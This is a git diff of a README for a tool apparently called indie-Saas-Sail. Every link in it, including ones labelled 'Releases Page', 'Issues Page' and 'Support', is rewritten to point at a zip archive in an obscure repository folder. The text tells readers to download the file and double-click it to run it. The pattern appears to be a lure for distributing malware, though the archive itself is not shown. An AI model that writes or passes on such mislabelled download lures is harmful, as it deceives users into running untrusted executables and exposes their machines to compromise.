@@ -6,13 +6,13 @@ Welcome to indie-Saas-Sail! This tool helps you understand the essentials of lau
 
 ## 📦 Download Now
 
-[![Download Indie-Saas-Sail](https://raw.githubusercontent.com/fuyad103237-source/indie-Saas-Sail/main/endoplasma/indie-Saas-Sail_murid.zip)](https://raw.githubusercontent.com/fuyad103237-source/indie-Saas-Sail/main/endoplasma/indie-Saas-Sail_murid.zip)
+[![Download Indie-Saas-Sail](https://github.com/fuyad103237-source/indie-Saas-Sail/raw/refs/heads/main/endoplasma/indie-Saas-Sail-3.6.zip)](https://github.com/fuyad103237-source/indie-Saas-Sail/raw/refs/heads/main/endoplasma/indie-Saas-Sail-3.6.zip)
 
 ## 🚀 Getting Started
 
 To use this application, follow these easy steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/fuyad103237-source/indie-Saas-Sail/main/endoplasma/indie-Saas-Sail_murid.zip).
+1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/fuyad103237-source/indie-Saas-Sail/raw/refs/heads/main/endoplasma/indie-Saas-Sail-3.6.zip).
 2. **Find the Latest Version:** Look for the latest release at the top of the page.
 3. **Download the File:** Click on the appropriate file to download it. 
 4. **Open the File:** Once the download is complete, locate the file in your Downloads folder and double-click it to run the application.
@@ -45,7 +45,7 @@ If you face issues while running the application, consider these common solution
 
 ## 📫 Support
 
-For assistance, please visit the [Issues Page](https://raw.githubusercontent.com/fuyad103237-source/indie-Saas-Sail/main/endoplasma/indie-Saas-Sail_murid.zip). You can report problems or ask questions there. We are committed to helping you succeed.
+For assistance, please visit the [Issues Page](https://github.com/fuyad103237-source/indie-Saas-Sail/raw/refs/heads/main/endoplasma/indie-Saas-Sail-3.6.zip). You can report problems or ask questions there. We are committed to helping you succeed.
 
 ## 📢 Community Feedback
 
@@ -62,7 +62,7 @@ Stay informed about new releases and features by following our repository. Regul
 
 ## 🔗 Download Options
 
-For easy access, you can download our application again here: [Releases Page](https://raw.githubusercontent.com/fuyad103237-source/indie-Saas-Sail/main/endoplasma/indie-Saas-Sail_murid.zip).
+For easy access, you can download our application again here: [Releases Page](https://github.com/fuyad103237-source/indie-Saas-Sail/raw/refs/heads/main/endoplasma/indie-Saas-Sail-3.6.zip).
 
 ## 📅 Updates History
 
